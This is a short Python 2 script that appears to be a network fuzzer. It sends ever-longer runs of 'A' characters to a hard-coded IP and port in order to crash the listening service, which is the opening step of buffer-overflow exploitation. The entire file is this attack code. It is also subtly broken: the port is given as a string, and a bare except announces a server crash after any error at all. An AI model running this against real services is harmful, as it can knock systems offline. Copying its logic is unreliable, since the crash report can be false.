#!/usr/bin/python

import socket, sys

ip = "192.168.1.100" # Change this
port = "8080" # Change this
buffer = ["A"]
counter = 100

while len(buffer) <=10:
    buffer.append("A"*counter)
    counter = counter + 100

try:
    for culo in buffer:
        print "\033[;36m"+"Sending %s bytes" % len(culo)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(culo + "\r\n")
        s.recv(1024)
        print "\033[;36m"+"OK"

except:
    print "\033[;36m"+"The server has surely crashed"
    sys.exit(0)

finally:
    s.close()
